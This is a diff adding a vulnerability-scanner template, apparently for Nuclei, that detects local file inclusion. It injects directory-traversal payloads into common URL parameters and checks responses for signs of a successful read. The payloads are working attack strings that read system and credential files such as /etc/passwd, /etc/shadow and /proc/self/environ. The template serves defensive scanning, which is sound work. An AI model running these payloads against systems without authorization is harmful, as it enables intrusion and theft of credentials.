@@ -1,0 +1,47 @@
+id: lfi-seclists
+
+info:
+  name: Local File Inclusion (LFI) - Common Payloads
+  author: soumen_mridha
+  severity: high
+  description: Detects Local File Inclusion vulnerabilities using known payloads from SecLists.
+  tags: lfi,file-inclusion,seclists,disclosure
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file={{lfi_payload}}"
+      - "{{BaseURL}}?page={{lfi_payload}}"
+      - "{{BaseURL}}?path={{lfi_payload}}"
+      - "{{BaseURL}}?url={{lfi_payload}}"
+      - "{{BaseURL}}/{{lfi_payload}}"
+
+    payloads:
+      lfi_payload:
+        - ../../../../../../../../etc/passwd
+        - ../../../../../../../../etc/passwd%00
+        - ../../../../../../../../etc/passwd%2500
+        - ..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+        - ..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00
+        - ../../../../../../../../proc/self/environ
+        - ../../../../../../../../windows/win.ini
+        - ../../../../../../../../boot.ini
+        - ../../../../../../../../etc/issue
+        - ../../../../../../../../etc/shadow
+        - ../../../../../../../../etc/group
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "root:x:0:0:"
+          - "daemon:x:"
+          - "/bin/bash"
+          - "[boot loader]"
+          - "[fonts]"
+          - "[extensions]"
+        part: body
+
+      - type: status
+        status:
+          - 200
